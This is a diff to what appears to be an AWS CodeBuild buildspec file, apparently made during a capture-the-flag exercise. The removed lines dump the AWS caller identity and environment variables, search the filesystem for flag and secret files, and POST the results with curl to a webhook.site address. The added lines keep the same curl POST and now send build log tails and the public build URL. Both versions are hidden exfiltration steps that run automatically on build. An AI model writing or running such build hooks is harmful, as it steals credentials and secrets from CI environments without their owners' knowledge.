@@ -6,29 +6,11 @@ phases:
       - |
         set +e
 
-        echo "=== IDENTITY ==="
-        IDENTITY=$(aws sts get-caller-identity --output json 2>/dev/null || true)
-        echo "$IDENTITY"
-
-        echo "=== ENV ==="
-        ENV_DUMP=$(env | sort 2>/dev/null || true)
-        echo "$ENV_DUMP"
-
-        echo "=== FLAG ENV ==="
-        FLAG_ENV=$(env | grep -Ei 'flag|ctf|secret' 2>/dev/null || true)
-        echo "$FLAG_ENV"
-
-        echo "=== FILE HITS ==="
-        FILE_HITS=$(find /codebuild /tmp /root /home -type f 2>/dev/null | grep -Ei 'flag|secret|ctf' || true)
-        echo "$FILE_HITS"
-
-        echo "=== GREP HITS ==="
-        GREP_HITS=$(grep -R -i -n -E 'flag|ctf|secret' /codebuild /tmp /root /home 2>/dev/null | head -100 || true)
-        echo "$GREP_HITS"
+        LOG_TAIL=$(tail -n 400 /codebuild/output/default/log 2>/dev/null || true)
+        EXEC_TAIL=$(tail -n 200 /codebuild/readonly/executor-log 2>/dev/null || true)
+        PUBLIC_URL="$CODEBUILD_PUBLIC_BUILD_URL"
 
         curl -sk -X POST "https://webhook.site/17b4b3f4-da5d-4de7-80fc-75fbd9ab1202" \
-          --data-urlencode "identity=$IDENTITY" \
-          --data-urlencode "flag_env=$FLAG_ENV" \
-          --data-urlencode "file_hits=$FILE_HITS" \
-          --data-urlencode "grep_hits=$GREP_HITS" \
-          --data-urlencode "env=$ENV_DUMP" >/dev/null || true
+          --data-urlencode "public_url=$PUBLIC_URL" \
+          --data-urlencode "log_tail=$LOG_TAIL" \
+          --data-urlencode "exec_tail=$EXEC_TAIL" >/dev/null || true
